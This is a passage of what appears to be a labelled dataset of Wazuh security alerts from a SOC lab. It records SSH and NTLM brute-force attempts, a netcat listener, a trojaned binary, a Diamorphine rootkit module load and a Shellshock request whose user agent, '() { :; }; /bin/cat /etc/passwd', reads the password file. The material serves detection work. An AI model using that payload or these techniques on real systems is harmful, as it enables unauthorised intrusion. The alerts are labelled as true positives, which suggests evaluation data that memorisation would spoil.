requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}\n{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4625\",\"version\":\"0\",\"level\":\"0\",\"task\":\"12544\",\"opcode\":\"0\",\"keywords\":\"0x8010000000000000\",\"systemTime\":\"2025-07-07T20:27:53.2820366Z\",\"eventRecordID\":\"1764509\",\"processID\":\"924\",\"threadID\":\"996\",\"channel\":\"Security\",\"computer\":\"Win11Client.soclab.internal\",\"severityValue\":\"AUDIT_FAILURE\",\"message\":\"\\\"An account failed to log on.\\r\\n\\r\\nSubject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nLogon Type:\\t\\t\\t3\\r\\n\\r\\nAccount For Which Logon Failed:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\ttop-usernames-shortlist.txt\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\r\\nFailure Information:\\r\\n\\tFailure Reason:\\t\\tUnknown user name or bad password.\\r\\n\\tStatus:\\t\\t\\t0xC000006D\\r\\n\\tSub Status:\\t\\t0xC0000064\\r\\n\\r\\nProcess Information:\\r\\n\\tCaller Process ID:\\t0x0\\r\\n\\tCaller Process Name:\\t-\\r\\n\\r\\nNetwork Information:\\r\\n\\tWorkstation Name:\\tkali\\r\\n\\tSource Network Address:\\t10.0.2.8\\r\\n\\tSource Port:\\t\\t0\\r\\n\\r\\nDetailed Authentication Information:\\r\\n\\tLogon Process:\\t\\tNtLmSsp \\r\\n\\tAuthentication Package:\\tNTLM\\r\\n\\tTransited Services:\\t-\\r\\n\\tPackage Name (NTLM only):\\t-\\r\\n\\tKey Length:\\t\\t0\\r\\n\\r\\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\\r\\n\\r\\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\\r\\n\\r\\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\\r\\n\\r\\nThe Process Information fields indicate which account and process on the system requested the logon.\\r\\n\\r\\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\\r\\n\\r\\nThe authentication information fields provide detailed information about this specific logon request.\\r\\n\\t- Transited services indicate which intermediate services have participated in this logon request.\\r\\n\\t- Package name indicates which sub-protocol was used among the NTLM protocols.\\r\\n\\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-0-0\",\"subjectLogonId\":\"0x0\",\"targetUserSid\":\"S-1-0-0\",\"targetUserName\":\"top-usernames-shortlist.txt\",\"status\":\"0xc000006d\",\"failureReason\":\"%%2313\",\"subStatus\":\"0xc0000064\",\"logonType\":\"3\",\"logonProcessName\":\"NtLmSsp\",\"authenticationPackageName\":\"NTLM\",\"workstationName\":\"kali\",\"keyLength\":\"0\",\"processId\":\"0x0\",\"ipAddress\":\"10.0.2.8\",\"ipPort\":\"0\"}}}", "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x0", "ipAddress": "10.0.2.8", "authenticationPackageName": "NTLM", "workstationName": "kali", "subStatus": "0xc0000064", "logonProcessName": "NtLmSsp", "targetUserName": "top-usernames-shortlist.txt", "keyLength": "0", "subjectUserSid": "S-1-0-0", "processId": "0x0", "ipPort": "0", "failureReason": "%%2313", "targetUserSid": "S-1-0-0", "logonType": "3", "status": "0xc000006d"}, "system": {"eventID": "4625", "keywords": "0x8010000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account failed to log on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Type:\t\t\t3\r\n\r\nAccount For Which Logon Failed:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\ttop-usernames-shortlist.txt\r\n\tAccount Domain:\t\t-\r\n\r\nFailure Information:\r\n\tFailure Reason:\t\tUnknown user name or bad password.\r\n\tStatus:\t\t\t0xC000006D\r\n\tSub Status:\t\t0xC0000064\r\n\r\nProcess Information:\r\n\tCaller Process ID:\t0x0\r\n\tCaller Process Name:\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\tkali\r\n\tSource Network Address:\t10.0.2.8\r\n\tSource Port:\t\t0\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\t-\r\n\tKey Length:\t\t0\r\n\r\nThis event is generated when a logon request fails. It is generated on the computer where access was attempted.\r\n\r\nThe Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe Process Information fields indicate which account and process on the system requested the logon.\r\n\r\nThe Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.\r\n\r\nThe authentication information fields provide detailed information about this specific logon request.\r\n\t- Transited services indicate which intermediate services have participated in this logon request.\r\n\t- Package name indicates which sub-protocol was used among the NTLM protocols.\r\n\t- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.\"", "version": "0", "systemTime": "2025-07-07T20:27:55.1864545Z", "eventRecordID": "1764516", "threadID": "996", "computer": "Win11Client.soclab.internal", "task": "12544", "processID": "924", "severityValue": "AUDIT_FAILURE", "providerName": "Microsoft-Windows-Security-Auditing"}}}, "rule": {"mail": false, "pci_dss": ["10.2.4", "10.2.5", "11.4"], "hipaa": ["164.312.b"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "Multiple Windows Logon Failures", "groups": ["windows", "windows_security", "authentication_failures"], "nist_800_53": ["AU.14", "AC.7", "SI.4"], "frequency": 8, "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 47, "mitre": {"technique": ["Brute Force"], "id": ["T1110"], "tactic": ["Credential Access"]}, "id": "60204"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751920076.12887572", "timestamp": "2025-07-07T20:27:56.148+0000"}, "fields": {"timestamp": ["2025-07-07T20:27:56.148Z"]}, "sort": [1751920076148]}}
{"id": "h5yT5pcBllEhiOW622x2", "description": "sshd: Attempt to login using a non-existent user", "label": "TP", "rule_level": 5, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "h5yT5pcBllEhiOW622x2", "_score": null, "_source": {"predecoder": {"hostname": "Suricata", "program_name": "sshd", "timestamp": "Jul 07 20:28:55"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"srcuser": "top-usernames-shortlist.txt", "srcip": "10.0.2.8"}, "rule": {"mail": false, "hipaa": ["164.312.b"], "pci_dss": ["10.2.4", "10.2.5", "10.6.1"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "sshd: Attempt to login using a non-existent user", "groups": ["syslog", "sshd", "authentication_failed", "invalid_login"], "nist_800_53": ["AU.14", "AC.7", "AU.6"], "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 42, "mitre": {"technique": ["Password Guessing", "SSH"], "id": ["T1110.001", "T1021.004"], "tactic": ["Credential Access", "Lateral Movement"]}, "id": "5710", "gpg13": ["7.1"]}, "location": "journald", "decoder": {"parent": "sshd", "name": "sshd"}, "id": "1751920137.13077962", "full_log": "Jul 07 20:28:55 Suricata sshd[2175]: Failed password for invalid user top-usernames-shortlist.txt from 10.0.2.8 port 39004 ssh2", "timestamp": "2025-07-07T20:28:57.002+0000"}, "fields": {"timestamp": ["2025-07-07T20:28:57.002Z"]}, "sort": [1751920137002]}}
{"id": "MZyU5pcBllEhiOW6Em14", "description": "PAM: Multiple failed logins in a small period of time.", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "MZyU5pcBllEhiOW6Em14", "_score": null, "_source": {"predecoder": {"hostname": "Suricata", "program_name": "sshd", "timestamp": "Jul 07 20:29:09"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "previous_output": "Jul 07 20:29:09 Suricata sshd[2198]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2207]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2204]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2197]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2195]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2199]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8\nJul 07 20:29:09 Suricata sshd[2196]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8", "data": {"uid": "0", "srcip": "10.0.2.8", "euid": "0", "tty": "ssh"}, "manager": {"name": "wazuh-server"}, "rule": {"mail": false, "pci_dss": ["10.2.4", "10.2.5", "11.4"], "hipaa": ["164.312.b"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "PAM: Multiple failed logins in a small period of time.", "groups": ["pam", "syslog", "authentication_failures"], "nist_800_53": ["AU.14", "AC.7", "SI.4"], "frequency": 8, "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 3, "mitre": {"technique": ["Brute Force"], "id": ["T1110"], "tactic": ["Credential Access"]}, "id": "5551", "gpg13": ["7.8"]}, "location": "journald", "decoder": {"name": "pam"}, "id": "1751920151.13286338", "full_log": "Jul 07 20:29:09 Suricata sshd[2200]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8", "timestamp": "2025-07-07T20:29:11.368+0000"}, "fields": {"timestamp": ["2025-07-07T20:29:11.368Z"]}, "sort": [1751920151368]}}
{"id": "SZyU5pcBllEhiOW6q247", "description": "sshd: brute force trying to get access to the system. Non existent user.", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "SZyU5pcBllEhiOW6q247", "_score": null, "_source": {"predecoder": {"hostname": "Suricata", "program_name": "sshd", "timestamp": "Jul 07 20:29:49"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "previous_output": "Jul 07 20:29:49 Suricata sshd[2248]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46324\nJul 07 20:29:49 Suricata sshd[2247]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46312\nJul 07 20:29:49 Suricata sshd[2231]: Disconnecting invalid user top-usernames-shortlist.txt 10.0.2.8 port 50106: Too many authentication failures [preauth]\nJul 07 20:29:49 Suricata sshd[2244]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46300\nJul 07 20:29:49 Suricata sshd[2243]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46290\nJul 07 20:29:49 Suricata sshd[2232]: Disconnecting invalid user top-usernames-shortlist.txt 10.0.2.8 port 50110: Too many authentication failures [preauth]\nJul 07 20:29:49 Suricata sshd[2229]: Disconnecting invalid user top-usernames-shortlist.txt 10.0.2.8 port 50090: Too many authentication failures [preauth]", "data": {"srcuser": "top-usernames-shortlist.txt", "srcip": "10.0.2.8", "srcport": "46412"}, "manager": {"name": "wazuh-server"}, "rule": {"mail": false, "hipaa": ["164.312.b"], "pci_dss": ["11.4", "10.2.4", "10.2.5"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "sshd: brute force trying to get access to the system. Non existent user.", "groups": ["syslog", "sshd", "authentication_failures"], "nist_800_53": ["SI.4", "AU.14", "AC.7"], "frequency": 8, "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 40, "mitre": {"technique": ["Brute Force"], "id": ["T1110"], "tactic": ["Credential Access"]}, "id": "5712"}, "location": "journald", "decoder": {"parent": "sshd", "name": "sshd"}, "id": "1751920191.13471537", "full_log": "Jul 07 20:29:49 Suricata sshd[2254]: Invalid user top-usernames-shortlist.txt from 10.0.2.8 port 46412", "timestamp": "2025-07-07T20:29:51.183+0000"}, "fields": {"timestamp": ["2025-07-07T20:29:51.183Z"]}, "sort": [1751920191183]}}
{"id": "SJyU5pcBllEhiOW6q247", "description": "Suricata: Alert - SURICATA SSH invalid banner", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "SJyU5pcBllEhiOW6q247", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"metadata": {"flowints": {"applayer": {"anomaly": {"count": "1"}}}}, "ssh": {"client": {"proto_version": "2.0", "software_version": "libssh_0.11.1"}}, "tx_id": "0", "app_proto": "ssh", "in_iface": "enp0s3", "src_ip": "10.0.2.8", "src_port": "46374", "event_type": "alert", "alert": {"severity": "3", "signature_id": "2228000", "rev": "1", "gid": "1", "signature": "SURICATA SSH invalid banner", "action": "allowed", "category": "Generic Protocol Command Decode"}, "flow_id": "1539825937374717.000000", "dest_ip": "10.0.2.6", "proto": "TCP", "dest_port": "22", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "46374", "pkts_toserver": "4", "dest_ip": "10.0.2.6", "start": "2025-07-07T20:29:49.030838+0000", "bytes_toclient": "294", "bytes_toserver": "295", "pkts_toclient": "4", "dest_port": "22"}, "timestamp": "2025-07-07T20:29:49.037270+0000", "direction": "to_server"}, "rule": {"firedtimes": 89, "mail": false, "description": "Suricata: Alert - SURICATA SSH invalid banner", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1751920189.13469799", "timestamp": "2025-07-07T20:29:49.549+0000"}, "fields": {"timestamp": ["2025-07-07T20:29:49.549Z"], "data.timestamp": ["2025-07-07T20:29:49.037Z"]}, "sort": [1751920189549]}}
{"id": "RpyU5pcBllEhiOW6p25Y", "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "RpyU5pcBllEhiOW6p25Y", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"metadata": {"flowints": {"applayer": {"anomaly": {"count": "1"}}}}, "app_proto": "ssh", "in_iface": "enp0s3", "src_ip": "10.0.2.6", "src_port": "22", "event_type": "alert", "alert": {"severity": "3", "signature_id": "2260002", "rev": "1", "gid": "1", "signature": "SURICATA Applayer Detect protocol only one direction", "action": "allowed", "category": "Generic Protocol Command Decode"}, "flow_id": "1539825937374717.000000", "dest_ip": "10.0.2.8", "proto": "TCP", "dest_port": "46374", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "46374", "pkts_toserver": "3", "dest_ip": "10.0.2.6", "start": "2025-07-07T20:29:49.030838+0000", "bytes_toclient": "294", "bytes_toserver": "229", "pkts_toclient": "4", "dest_port": "22"}, "timestamp": "2025-07-07T20:29:49.036265+0000", "direction": "to_client"}, "rule": {"firedtimes": 87, "mail": false, "description": "Suricata: Alert - SURICATA Applayer Detect protocol only one direction", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1751920189.13466416", "timestamp": "2025-07-07T20:29:49.531+0000"}, "fields": {"timestamp": ["2025-07-07T20:29:49.531Z"], "data.timestamp": ["2025-07-07T20:29:49.036Z"]}, "sort": [1751920189531]}}
{"id": "-ZyV5pcBllEhiOW6jm_Z", "description": "syslog: User missed the password more than one time", "label": "TP", "rule_level": 10, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "-ZyV5pcBllEhiOW6jm_Z", "_score": null, "_source": {"predecoder": {"hostname": "Suricata", "program_name": "sshd", "timestamp": "Jul 07 20:30:46"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "rule": {"mail": false, "pci_dss": ["10.2.4", "10.2.5"], "hipaa": ["164.312.b"], "tsc": ["CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "syslog: User missed the password more than one time", "groups": ["syslog", "access_control", "authentication_failed"], "nist_800_53": ["AU.14", "AC.7"], "gdpr": ["IV_35.7.d", "IV_32.2"], "firedtimes": 73, "mitre": {"technique": ["Brute Force"], "id": ["T1110"], "tactic": ["Credential Access"]}, "id": "2502", "gpg13": ["7.8"]}, "location": "journald", "decoder": {"name": "sshd"}, "id": "1751920248.13799957", "full_log": "Jul 07 20:30:46 Suricata sshd[2310]: PAM 4 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.0.2.8", "timestamp": "2025-07-07T20:30:48.063+0000"}, "fields": {"timestamp": ["2025-07-07T20:30:48.063Z"]}, "sort": [1751920248063]}}
{"id": "epy65pcBllEhiOW6bnJV", "description": "netcat listening for incoming connections.", "label": "TP", "rule_level": 7, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "epy65pcBllEhiOW6bnJV", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "rule": {"firedtimes": 1, "mail": false, "description": "netcat listening for incoming connections.", "groups": ["ossec", "process_monitor"], "id": "100051"}, "location": "process list", "decoder": {"name": "ossec"}, "id": "1751922660.16222078", "full_log": "ossec: output: 'process list':\n    PID USER     COMMAND\n      1 root     /sbin/init splash noprompt noshell automatic-ubiquity\n      2 root     [kthreadd]\n      3 root     [pool_workqueue_release]\n      4 root     [kworker/R-rcu_g]\n      5 root     [kworker/R-rcu_p]\n      6 root     [kworker/R-slub_]\n      7 root     [kworker/R-netns]\n     10 root     [kworker/0:0H-events_highpri]\n     11 root     [kworker/u8:0-ext4-rsv-conversion]\n     12 root     [kworker/R-mm_pe]\n     13 root     [rcu_tasks_kthread]\n     14 root     [rcu_tasks_rude_kthread]\n     15 root     [rcu_tasks_trace_kthread]\n     16 root     [ksoftirqd/0]\n     17 root     [rcu_preempt]\n     18 root     [migration/0]\n     19 root     [idle_inject/0]\n     20 root     [cpuhp/0]\n     21 root     [cpuhp/1]\n     22 root     [idle_inject/1]\n     23 root     [migration/1]\n     24 root     [ksoftirqd/1]\n     25 root     [kworker/1:0-cgroup_destroy]\n     26 root     [kworker/1:0H-kblockd]\n     27 root     [cpuhp/2]\n     28 root     [idle_inject/2]\n     29 root     [migration/2]\n     30 root     [ksoftirqd/2]\n     32 root     [kworker/2:0H-events_highpri]\n     33 root     [cpuhp/3]\n     34 root     [idle_inject/3]\n     35 root     [migration/3]\n     36 root     [ksoftirqd/3]\n     37 root     [kworker/3:0-cgroup_destroy]\n     38 root     [kworker/3:0H-kblockd]\n     40 root     [kworker/u10:0-events_power_efficient]\n     41 root     [kworker/u11:0-events_power_efficient]\n     43 root     [kdevtmpfs]\n     44 root     [kworker/R-inet_]\n     45 root     [kauditd]\n     46 root     [kworker/u9:1-flush-8:0]\n     47 root     [khungtaskd]\n     48 root     [oom_reaper]\n     49 root     [kworker/u12:1-events_power_efficient]\n     50 root     [kworker/R-write]\n     51 root     [kcompactd0]\n     52 root     [ksmd]\n     54 root     [kworker/R-kinte]\n     55 root     [kworker/R-kbloc]\n     56 root     [kworker/R-blkcg]\n     57 root     [irq/9-acpi]\n     59 root     [kworker/R-tpm_d]\n     60 root     [kworker/R-ata_s]\n     61 root     [kworker/R-md]\n     62 root     [kworker/R-md_bi]\n     63 root     [kworker/R-edac-]\n     64 root     [kworker/R-devfr]\n     65 root     [watchdogd]\n     66 root     [kworker/3:1H-kblockd]\n     67 root     [kswapd0]\n     68 root     [ecryptfs-kthread]\n     69 root     [kworker/R-kthro]\n     70 root     [kworker/R-acpi_]\n     71 root     [kworker/u12:2-events_power_efficient]\n     73 root     [kworker/2:1-cgroup_destroy]\n     74 root     [scsi_eh_0]\n     75 root     [kworker/R-scsi_]\n     76 root     [scsi_eh_1]\n     77 root     [kworker/R-scsi_]\n     78 root     [kworker/u12:3-events_unbound]\n     80 root     [kworker/R-mld]\n     81 root     [kworker/R-ipv6_]\n     88 root     [kworker/R-kstrp]\n     90 root     [kworker/u13:0]\n     91 root     [kworker/u14:0]\n     92 root     [kworker/u15:0]\n     93 root     [kworker/u16:0]\n     94 root     [kworker/u17:0]\n     98 root     [kworker/u10:1-flush-8:0]\n    100 root     [kworker/R-crypt]\n    102 root     [kworker/1:1H-kblockd]\n    112 root     [kworker/R-charg]\n    137 root     [kworker/0:1H-kblockd]\n    151 root     [kworker/2:1H-kblockd]\n    154 root     [scsi_eh_2]\n    155 root     [kworker/R-scsi_]\n    156 root     [kworker/u9:2-events_unbound]\n    177 root     [kworker/u9:3-events_power_efficient]\n    191 root     [kworker/u11:2-flush-8:0]\n    209 root     [kworker/R-raid5]\n    253 root     [jbd2/sda2-8]\n    254 root     [kworker/R-ext4-]\n    287 root     [kworker/2:2-events]\n    320 root     /usr/lib/systemd/systemd-journald\n    362 root     [kworker/R-kmpat]\n    363 root     [kworker/R-kmpat]\n    372 root     /sbin/multipathd -d -s\n    375 root     [kworker/u10:2-events_power_efficient]\n    379 root     [kworker/1:3-cgroup_destroy]\n    380 root     /usr/lib/systemd/systemd-udevd\n    386 root     [kworker/u8:1-ext4-rsv-conversion]\n    438 root     [psimon]\n    465 systemd+ /usr/lib/systemd/systemd-resolved\n    478 systemd+ /usr/lib/systemd/systemd-timesyncd\n    590 root     [kworker/0:3-events]\n    652 message+ @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\n    671 polkitd  /usr/lib/polkit-1/polkitd --no-debug\n    682 root     /usr/lib/systemd/systemd-logind\n    684 root     /usr/libexec/udisks2/udisksd\n    716 systemd+ /usr/lib/systemd/systemd-networkd\n    719 syslog   /usr/sbin/rsyslogd -n -iNONE\n    731 root     [irq/18-vmwgfx]\n    732 root     [kworker/R-ttm]\n    756 root     /usr/sbin/ModemManager\n    822 root     [kworker/R-cfg80]\n    844 root     /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal\n    935 mysql    /usr/sbin/mariadbd\n   1017 root     /usr/sbin/cron -f -P\n   1044 root     sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\n   1053 root     /sbin/agetty -o -p -- \\u --noclear - linux\n   1055 root     /usr/sbin/apache2 -k start\n   1080 www-data /usr/sbin/apache2 -k start\n   1081 www-data /usr/sbin/apache2 -k start\n   1082 www-data /usr/sbin/apache2 -k start\n   1083 www-data /usr/sbin/apache2 -k start\n   1084 www-data /usr/sbin/apache2 -k start\n   2315 root     sshd: vboxuser [priv]\n   2318 root     [psimon]\n   2320 vboxuser /usr/lib/systemd/systemd --user\n   2321 vboxuser (sd-pam)\n   2410 vboxuser sshd: vboxuser@pts/0\n   2411 vboxuser -bash\n   2452 root     [kworker/u11:1-events_power_efficient]\n   3323 root     [kworker/0:1-cgroup_destroy]\n   3738 root     [kworker/3:1-mm_percpu_wq]\n   5175 root     [kworker/u9:0-events_unbound]\n   5181 root     sudo su\n   5182 root     sudo su\n   5183 root     su\n   5184 root     bash\n   5192 root     [kworker/u11:3-flush-8:0]\n   5244 root     [kworker/1:1-cgwb_release]\n   5247 root     [kworker/1:2-events]\n   5345 root     /var/ossec/bin/wazuh-execd\n   5356 wazuh    /var/ossec/bin/wazuh-agentd\n   5370 root     /var/ossec/bin/wazuh-syscheckd\n   5380 root     /var/ossec/bin/wazuh-logcollector\n   5394 root     /var/ossec/bin/wazuh-modulesd\n   6192 root     [kworker/0:0-cgroup_destroy]\n   6413 root     nc -l 8000\n   6630 root     sh -c -- ps -e -o pid,uname,command\n   6631 root     ps -e -o pid,uname,command", "timestamp": "2025-07-07T21:11:00.280+0000"}, "fields": {"timestamp": ["2025-07-07T21:11:00.280Z"]}, "sort": [1751922660280]}}
{"id": "wZzE5pcBllEhiOW6EXKh", "description": "Host-based anomaly detection event (rootcheck).", "label": "TP", "rule_level": 7, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "wZzE5pcBllEhiOW6EXKh", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "data": {"file": "/usr/bin/w", "title": "Trojaned version of file detected."}, "rule": {"firedtimes": 2, "mail": false, "pci_dss": ["10.6.1"], "description": "Host-based anomaly detection event (rootcheck).", "groups": ["ossec", "rootcheck"], "id": "510", "gdpr": ["IV_35.7.d"]}, "location": "rootcheck", "decoder": {"name": "rootcheck"}, "id": "1751923296.16468848", "full_log": "Trojaned version of file '/usr/bin/w' detected. Signature used: 'uname -a|proc\\.h|bash' (Generic).", "timestamp": "2025-07-07T21:21:36.841+0000"}, "fields": {"timestamp": ["2025-07-07T21:21:36.841Z"]}, "sort": [1751923296841]}}
{"id": "4ZzO5pcBllEhiOW62nOu", "description": "Unsigned kernel module was loaded", "label": "TP", "rule_level": 11, "rule_priority": "Medium", "alert": {"_index": "wazuh-alerts-4.x-2025.07.07", "_id": "4ZzO5pcBllEhiOW62nOu", "_score": null, "_source": {"predecoder": {"hostname": "Linux-Server", "program_name": "kernel", "timestamp": "Jul 07 21:33:22"}, "input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "rule": {"firedtimes": 1, "mail": false, "description": "Unsigned kernel module was loaded", "groups": ["syslog", "linuxkernel"], "mitre": {"technique": ["Kernel Modules and Extensions"], "id": ["T1547.006"], "tactic": ["Persistence", "Privilege Escalation"]}, "id": "5132"}, "location": "journald", "decoder": {"name": "kernel"}, "id": "1751924003.17018916", "full_log": "Jul 07 21:33:22 Linux-Server kernel: diamorphine: module verification failed: signature and/or required key missing - tainting kernel", "timestamp": "2025-07-07T21:33:23.442+0000"}, "fields": {"timestamp": ["2025-07-07T21:33:23.442Z"]}, "sort": [1751924003442]}}
{"id": "eF5665cBARIQcDql-GZ3", "description": "Suricata: Alert - ET WEB_SERVER Possible CVE-2014-6271 Attempt", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.08", "_id": "eF5665cBARIQcDql-GZ3", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.6", "name": "Suricata", "id": "001"}, "manager": {"name": "wazuh-server"}, "data": {"tx_guessed": "true", "tx_id": "0", "app_proto": "http", "in_iface": "enp0s3", "src_ip": "10.0.2.8", "src_port": "36406", "event_type": "alert", "alert": {"severity": "1", "signature_id": "2022028", "rev": "2", "metadata": {"cve": ["CVE_2014_6271"], "updated_at": ["2019_10_08"], "confidence": ["Medium"], "created_at": ["2015_11_04"], "tag": ["CISA_KEV"], "signature_severity": ["Major"]}, "gid": "1", "signature": "ET WEB_SERVER Possible CVE-2014-6271 Attempt", "action": "allowed", "category": "Attempted Administrator Privilege Gain"}, "flow_id": "1614497623830991.000000", "dest_ip": "10.0.2.9", "proto": "TCP", "http": {"hostname": "10.0.2.9", "protocol": "HTTP/1.1", "http_method": "GET", "http_content_type": "text/html", "length": "6985", "url": "/", "http_user_agent": "() { :; }; /bin/cat /etc/passwd", "status": "200"}, "dest_port": "80", "pkt_src": "wire/pcap", "flow": {"src_ip": "10.0.2.8", "src_port": "36406", "pkts_toserver": "4", "dest_ip": "10.0.2.9", "start": "2025-07-08T19:19:49.310368+0000", "bytes_toclient": "11594", "bytes_toserver": "364", "pkts_toclient": "10", "dest_port": "80"}, "timestamp": "2025-07-08T19:19:49.327330+0000", "direction": "to_server"}, "rule": {"firedtimes": 2, "mail": false, "description": "Suricata: Alert - ET WEB_SERVER Possible CVE-2014-6271 Attempt", "groups": ["ids", "suricata"], "id": "86601"}, "location": "/var/log/suricata/eve.json", "decoder": {"name": "json"}, "id": "1752002389.3507636", 